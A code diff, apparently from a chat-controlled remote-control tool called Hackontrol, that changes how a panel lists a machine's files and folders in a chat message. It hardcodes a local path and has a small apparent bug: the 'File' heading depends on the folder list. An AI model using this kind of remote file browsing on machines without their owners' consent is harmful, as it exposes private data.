@@ -1,6 +1,8 @@
 package com.khopan.hackontrol.panel;
 
 import java.io.File;
+import java.util.ArrayList;
+import java.util.List;
 
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -25,7 +27,7 @@ public class FilePanel extends Panel {
 
 	@Override
 	public void registeration() {
-		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(null, context.reply()));
+		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(new File("D:\\GitHub Repository\\Hackontrol"), context.reply()));
 	}
 
 	@Override
@@ -58,17 +60,47 @@ public class FilePanel extends Panel {
 			return;
 		}
 
+		List<File> fileList = new ArrayList<>();
+		List<File> folderList = new ArrayList<>();
+
+		for(File file : files) {
+			if(file.isDirectory()) {
+				folderList.add(file);
+			} else {
+				fileList.add(file);
+			}
+		}
+
 		StringBuilder builder = new StringBuilder();
 		builder.append("**");
 		builder.append(pathName);
-		builder.append("**\n```\n");
+		builder.append("**");
+		int index = 0;
 
-		for(File file : files) {
-			builder.append(file.getAbsolutePath());
-			builder.append('\n');
+		if(!folderList.isEmpty()) {
+			builder.append("\n***File***");
 		}
 
-		builder.append("\n```");
+		for(File file : fileList) {
+			builder.append("\n`");
+			builder.append(++index);
+			builder.append(") ");
+			builder.append(file.getName());
+			builder.append('`');
+		}
+
+		if(!folderList.isEmpty()) {
+			builder.append("\n***Folder***");
+		}
+
+		for(File file : folderList) {
+			builder.append("\n`");
+			builder.append(++index);
+			builder.append(") ");
+			builder.append(folder == null ? file.getAbsolutePath() : file.getName());
+			builder.append('`');
+		}
+
 		HackontrolMessage.deletable(sender, builder.toString());
 	}
 }
